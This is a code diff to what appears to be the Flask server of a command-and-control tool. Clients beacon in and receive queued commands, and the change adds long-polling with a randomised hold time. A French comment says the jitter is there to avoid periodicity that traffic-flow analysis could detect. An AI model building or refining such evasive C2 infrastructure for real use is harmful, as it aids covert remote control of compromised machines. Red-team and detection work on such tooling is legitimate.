@@ -1,5 +1,6 @@
 from flask import Flask, request, jsonify
 from datetime import datetime
+import random
 import requests
 from controller.clients import ClientManager
 from controller.commands import CommandManager
@@ -8,6 +9,12 @@ from controller.protocol import RegisterRequest, RegisterResponse, BeaconRespons
 app = Flask(__name__)
 manager = None
 command_manager = None
+
+# Tenue de la requete /beacon : le client garde un POST ouvert et recoit la
+# commande des qu'elle est disponible. Le tirage aleatoire evite une
+# periodicite detectable par analyse de flux.
+HOLD_MIN_SECONDS = 20.0
+HOLD_MAX_SECONDS = 35.0
 
 def setup_network(client_manager_instance, command_manager_instance):
     global manager, command_manager
@@ -56,15 +63,16 @@ def beacon():
 
     manager.update_last_seen(client_id=req.client_id)
 
-    commande = command_manager.get_next_command(req.client_id)
-    
+    # Long-poll : la requete reste ouverte jusqu'a l'arrivee d'une commande
+    # ou l'expiration de la tenue.
+    commande = command_manager.wait_for_command(
+        req.client_id, timeout=random.uniform(HOLD_MIN_SECONDS, HOLD_MAX_SECONDS))
+
     if commande is not None:
         response = BeaconResponse(
-            command_id=commande["command_id"],
-            command=commande["action_type"]
+            command_id=commande.command_id,
+            command=commande.action_type
         )
-
-        command_manager.commands[commande["command_id"]].send_at = datetime.now()
     else:
         response = BeaconResponse(command_id="", command="")
 
